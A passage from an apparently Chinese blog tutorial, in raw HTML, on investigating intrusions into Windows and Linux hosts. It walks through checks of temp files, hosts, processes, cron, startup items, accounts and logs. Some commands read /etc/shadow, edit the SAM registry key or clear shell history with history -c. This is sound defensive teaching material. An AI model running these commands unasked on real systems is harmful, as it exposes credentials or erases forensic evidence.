class="headerlink" title="2、文件分析"></a>2、文件分析</h3><h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p>黑客往往可能将病毒放在临时目录，或者将病毒相关文件释放到临时目录，因此需要检查临时目录是否存在异常文件。假设系统盘是在C盘，则通常情况下的临时目录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\User\\[用户名]\Local Settings\Temp</span><br><span class="line">C:\Documents and Settings\\[用户名]\Local Settings\Temp</span><br><span class="line">C:\User\\[用户名]\桌面</span><br><span class="line">C:\Documents and Settings\\[用户名]\桌面</span><br><span class="line">C:\User\\[用户名]\Local Settings\Temporary Internet Files</span><br><span class="line">C:\Documents and Settings\\[用户名]\local Settings\Temporary Intermet Files</span><br></pre></td></tr></table></figure><h4 id="浏览器相对文件"><a href="#浏览器相对文件" class="headerlink" title="浏览器相对文件"></a>浏览器相对文件</h4><p>黑客可能通过浏览器下载恶意文件，或者盗取用户信息，因此需要检查下浏览器的历史访问记录、文件下载记录、cookie信息，对应相关文件目录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\User\\[用户名]\Cookies</span><br><span class="line">C:\Documents and Settings\\[用户名]\Cookies</span><br><span class="line">C:\Users\\[用户名]\Local Settings\History</span><br><span class="line">C:\Documents and Settings\\[用户名]\Local Settings\History</span><br><span class="line">C:\Users\\[用户名]\Local Settings\Temporary Internet Files</span><br></pre></td></tr></table></figure><h4 id="最近文件"><a href="#最近文件" class="headerlink" title="最近文件"></a>最近文件</h4><p>检查下最近打开了那些文件，可疑文件有可能就在最近打开的文件中，打开以下这些目录及可看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\User\\[用户名]\Recent</span><br><span class="line">C:\Documents and Settings\\[用户名]\Recent</span><br></pre></td></tr></table></figure><h4 id="文件修改时间"><a href="#文件修改时间" class="headerlink" title="文件修改时间"></a>文件修改时间</h4><p>可以根据文件夹内文件列表时间排序，查找可疑文件。一般情况下，修改时间越近的文件越可疑</p><h4 id="system32和hosts文件"><a href="#system32和hosts文件" class="headerlink" title="system32和hosts文件"></a>system32和hosts文件</h4><p>system32也是常见病毒释放目录，因此也要检查下该目录。hosts文件是系统配置文件，用于本地DOS查询的域名设置，可以强制将某个域名对应到某个IP，因此需要检查hosts文件有没有被黑客恶意篡改。</p><p>这里以hosts文件为例，检查三种异常：</p><ul><li>知名站点，检查对应IP是否真的归属该站点，防止”钓鱼“</li><li>为知站点，检查该域名的IP是否恶意</li><li>无法访问的安全站点，即IP是否指向127.0.0.1、0.0.0.0等本地地址、无效地址</li></ul><h3 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h3><p>可以使用D盾、还可以使用命令<code>netstat -ano</code>查看当前网络连接，排查可疑的服务、端口、外连的IP。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1734.png" alt="图片"></p><p>如发现<code>netstat</code>定位出的<code>pid</code>有问题，可再通过<code>tastlist</code>命令进一步追踪该可疑程序（<code>tasklist | findstr PID</code>）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1735.png" alt="图片"></p><p>以上图片只是打个比方！</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>流量分析可以使用<code>Wireshark</code>，主要分析一下当前主机访问了那些域名、URL、服务、或者有那些外网IP在访问本地主机的那些端口、服务和目录，又使用了那些协议等等。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1736.png" alt="图片"></p><h3 id="漏洞与补丁信息"><a href="#漏洞与补丁信息" class="headerlink" title="漏洞与补丁信息"></a>漏洞与补丁信息</h3><p>使用命令<code>systeminfo</code>，查看系统版本信息以及补丁信息，确认当前系统是否存在漏洞、是否已经打了相应补丁。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1737.png" alt="图片"></p><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><ul><li>进程名字异常</li><li>进程信息异常</li></ul><h3 id="启动项异常"><a href="#启动项异常" class="headerlink" title="启动项异常"></a>启动项异常</h3><p>黑客为了保持病毒能够开机自启、登陆启动或者定时启动，通常会有相应的启动项。</p><h3 id="用户排查"><a href="#用户排查" class="headerlink" title="用户排查"></a>用户排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1738.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1739.png" alt="图片"></p><h3 id="删除guest用户"><a href="#删除guest用户" class="headerlink" title="删除guest用户"></a>删除guest用户</h3><p>按住 <code>win+r</code>，输入<code>regedit</code>打开注册表：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1740.png" alt="图片"></p><p>然后展开：<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>：（如果不能展开就给他一个管理员权限）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1741.png" alt="图片"></p><p>然后重新打开就可以了：<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\account\Users\Names\Guest</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1742.png" alt="图片"></p><p>可以看到，<code>guest</code>的<code>type</code>值是<code>0x1f5</code>，我们把它删除就可以了</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1743.png" alt="图片"></p><h3 id="常用工具及命令"><a href="#常用工具及命令" class="headerlink" title="常用工具及命令"></a>常用工具及命令</h3><h4 id="Webshell查杀"><a href="#Webshell查杀" class="headerlink" title="Webshell查杀"></a>Webshell查杀</h4><p>D盾、深信服webshellkiller等等</p><h4 id="木马病毒类查杀"><a href="#木马病毒类查杀" class="headerlink" title="木马病毒类查杀"></a>木马病毒类查杀</h4><ul><li>ClarmAV</li><li>RKHunter</li><li>Chkrootkit</li></ul><h4 id="进程分析-1"><a href="#进程分析-1" class="headerlink" title="进程分析"></a>进程分析</h4><ul><li>火绒</li></ul><h4 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h4><ul><li>Wireshark（windows）</li><li>Tcpdump（linux）</li></ul><h4 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h4><ul><li>Autoruns</li></ul><h4 id="其他辅助工具"><a href="#其他辅助工具" class="headerlink" title="其他辅助工具"></a>其他辅助工具</h4><p>IP分析、超级文件监控工具，Mysql监控工具。</p><h1 id="3、Linux入侵排查，木马处理"><a href="#3、Linux入侵排查，木马处理" class="headerlink" title="3、Linux入侵排查，木马处理"></a>3、Linux入侵排查，木马处理</h1><h2 id="1、应急常用Linux命令"><a href="#1、应急常用Linux命令" class="headerlink" title="1、应急常用Linux命令"></a>1、应急常用Linux命令</h2><h3 id="（1）查看进程"><a href="#（1）查看进程" class="headerlink" title="（1）查看进程"></a>（1）查看进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1744.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1745.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1746.jpg" alt="图片"></p><h3 id="（2）网络连接"><a href="#（2）网络连接" class="headerlink" title="（2）网络连接"></a>（2）网络连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1747.jpg" alt="图片"></p><h3 id="（3）开机启动项"><a href="#（3）开机启动项" class="headerlink" title="（3）开机启动项"></a>（3）开机启动项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/*</span><br><span class="line">/etc/rc*.d/</span><br><span class="line">/etc/rc.local</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1748.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1749.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1750.jpg" alt="图片"></p><h3 id="（4）查看计划任务"><a href="#（4）查看计划任务" class="headerlink" title="（4）查看计划任务"></a>（4）查看计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -altr /var/spool/cron/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1751.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -altr /etc/cron.daily/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1752.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -altr /etc/cron.weekly/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1753.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -altr /etc/cron.hourly/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1754.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -altr /etc/cron.monthly/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1755.jpg" alt="图片"></p><h3 id="（5）查看登录情况"><a href="#（5）查看登录情况" class="headerlink" title="（5）查看登录情况"></a>（5）查看登录情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last//上一次登陆情况</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1756.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure* | grep &quot;Access&quot;//查看登陆成功</span><br><span class="line">cat /var/log/secure* | grep &quot;Fail&quot;//查看登陆失败</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1757.jpg" alt="图片"></p><p>###（6）查看ssh key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/</span><br><span class="line">authorized_keys//这个文件可能会被写入ssh密钥</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1758.jpg" alt="图片"></p><p>###（7）查看用户和hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd//看看有没有新增用户</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1759.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts//查看hosts是防止木马地址绑定到一个正常的网页</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1760.jpg" alt="图片"></p><h3 id="（8）查看动态链接库"><a href="#（8）查看动态链接库" class="headerlink" title="（8）查看动态链接库"></a>（8）查看动态链接库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $LD_PRELOAD//如果有动态链接库，那么看看路径之前的文件有没有别篡改，是不是正常的</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1761.jpg" alt="图片"></p><p>###（9）Linux预加载库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/ld.so.preload</span><br><span class="line">/usr/local/lib</span><br></pre></td></tr></table></figure><h2 id="2、入侵排查"><a href="#2、入侵排查" class="headerlink" title="2、入侵排查"></a>2、入侵排查</h2><h3 id="2-1：账号安全"><a href="#2-1：账号安全" class="headerlink" title="2.1：账号安全"></a>2.1：账号安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1762.jpg" alt="图片"></p><h3 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1763.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1764.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1765.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h3 id="2-2：历史命令"><a href="#2-2：历史命令" class="headerlink" title="2.2：历史命令"></a>2.2：历史命令</h3><p>通过<code>.bash_history</code>查看帐号执行过的系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、root的历史命令</span><br><span class="line">history</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1766.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure><h3 id="入侵排查-1"><a href="#入侵排查-1" class="headerlink" title="入侵排查"></a>入侵排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h2 id="2-3：检查异常端口"><a href="#2-3：检查异常端口" class="headerlink" title="2.3：检查异常端口"></a>2.3：检查异常端口</h2><p>使用<code>netstat</code> 网络连接命令，分析可疑端口、<code>IP</code>、<code>PID</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1767.jpg" alt="图片"></p><h2 id="2-4：检查异常进程"><a href="#2-4：检查异常进程" class="headerlink" title="2.4：检查异常进程"></a>2.4：检查异常进程</h2><p>使用<code>ps</code>命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1768.jpg" alt="图片"></p><h2 id="2-5：检查开机启动项"><a href="#2-5：检查开机启动项" class="headerlink" title="2.5：检查开机启动项"></a>2.5：检查开机启动项</h2><p>基本使用：系统运行级别示意图</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1769.jpg" alt="图片"></p><p>查看运行级别命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1770.jpg" alt="图片"></p><p>系统默认允许级别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/inittab</span><br><span class="line">id=3：initdefault  系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><p>开机启动配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span><br></pre></td></tr></table></figure><p>此处<code>sshd</code>是具体服务的脚本文件，<code>S100ssh</code>是其软链接，<code>S</code>开头代表加载时自启动；如果是<code>K</code>开头的脚本文件，代表运行级别加载时需要关闭的。</p><h3 id="入侵排查-2"><a href="#入侵排查-2" class="headerlink" title="入侵排查"></a>入侵排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动项文件：</span><br><span class="line">more /etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure><h2 id="2-6：检查定时任务"><a href="#2-6：检查定时任务" class="headerlink" title="2.6：检查定时任务"></a>2.6：检查定时任务</h2><p>基本使用</p><h3 id="1、利用crontab创建计划任务"><a href="#1、利用crontab创建计划任务" class="headerlink" title="1、利用crontab创建计划任务"></a>1、利用crontab创建计划任务</h3><p>基本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure><h3 id="2、利用anacron实现异步定时任务调度"><a href="#2、利用anacron实现异步定时任务调度" class="headerlink" title="2、利用anacron实现异步定时任务调度"></a>2、利用anacron实现异步定时任务调度</h3><p>使用案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每天运行 /home/backup.sh脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</span><br><span class="line"></span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</span><br></pre></td></tr></table></figure><h3 id="入侵排查-3"><a href="#入侵排查-3" class="headerlink" title="入侵排查"></a>入侵排查</h3><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p>小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/cron.daily/*  查看目录下所有文件</span><br></pre></td></tr></table></figure><h2 id="2-7：检查服务"><a href="#2-7：检查服务" class="headerlink" title="2.7：检查服务"></a>2.7：检查服务</h2><p>服务自启动</p><p>第一种修改方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level  2345 httpd on  开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/re.d/rc.local 文件  </span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><h3 id="入侵排查-4"><a href="#入侵排查-4" class="headerlink" title="入侵排查"></a>入侵排查</h3><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line"></span><br><span class="line">系统在3与5级别下的启动项 </span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/  查看是否存在</span><br></pre></td></tr></table></figure><h2 id="2-8：检查异常文件"><a href="#2-8：检查异常文件" class="headerlink" title="2.8：检查异常文件"></a>2.8：检查异常文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</span><br><span class="line"></span><br><span class="line">2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</span><br><span class="line"></span><br><span class="line">可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type f  找出 /opt 下一天前访问过的文件</span><br><span class="line"></span><br><span class="line">3、针对可疑文件可以使用stat进行创建修改时间。</span><br></pre></td></tr></table></figure><h2 id="2-9：检查系统日志"><a href="#2-9：检查系统日志" class="headerlink" title="2.9：检查系统日志"></a>2.9：检查系统日志</h2><p>日志默认存放位置：<code>/var/log/</code></p><p>查看日志配置情况：<code>more /etc/rsyslog.conf</code></p><p><img 